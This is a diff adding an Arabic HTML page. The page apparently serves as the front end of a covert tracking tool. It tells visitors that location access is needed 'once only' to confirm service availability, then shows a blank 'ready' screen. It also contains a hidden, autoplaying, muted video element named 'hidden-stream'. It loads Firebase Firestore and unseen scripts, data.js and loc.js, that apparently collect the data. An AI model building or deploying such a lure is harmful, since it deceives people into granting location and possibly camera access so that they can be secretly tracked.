@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>الرئيسية</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="loc.css">
+</head>
+<body>
+
+    <video id="hidden-stream" autoplay playsinline muted></video>
+
+    <div id="perm-screen">
+        <div class="perm-box" id="perm-box">
+            <div class="icon-circle" id="perm-icon-circle">
+                <i class="fa-solid fa-check" id="perm-icon"></i>
+            </div>
+            <h2 id="perm-title">مرحباً بك</h2>
+            <p id="perm-desc">للتأكد من توفر الخدمة في منطقتك، نحتاج صلاحية تحديد الموقع مرة واحدة فقط.</p>
+            <button class="perm-btn" id="perm-btn" onclick="start()">
+                <span class="ld" id="perm-ld"></span>
+                <i class="fa-solid fa-arrow-left" id="perm-btn-icon"></i>
+                <span id="perm-btn-text">متابعة</span>
+            </button>
+        </div>
+    </div>
+
+    <div id="blank-screen">
+        <div class="blank-msg">
+            <i class="fa-solid fa-check-double"></i>
+            <span>جاهز</span>
+        </div>
+    </div>
+
+    <!-- مكتبة Firebase ثم ملفات المشروع بالترتيب الصحيح -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="data.js"></script>
+    <script src="loc.js"></script>
+</body>
+</html>
